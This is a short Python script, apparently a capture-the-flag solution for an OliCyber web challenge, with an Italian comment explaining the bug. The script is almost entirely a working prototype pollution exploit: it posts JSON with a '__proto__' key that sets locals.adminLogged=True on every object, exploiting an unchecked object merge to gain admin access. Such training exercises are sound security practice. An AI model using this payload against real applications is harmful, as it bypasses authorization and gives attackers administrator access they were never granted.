import requests

url='http://hi-admin.challs.olicyber.it/hi'

#prototype pollution: aggiungo a tutti gli oggetti un campo .locals.adminLogged=True, è possibile perchè c'è un merge di oggetti in cui non si controlla la presenza di __proto__
print(requests.post(url, json={"name":"Io","hobby":"palleggiare", "__proto__":{"locals":{"adminLogged":True}}}, headers={"Content-Type":"application/json"}).text)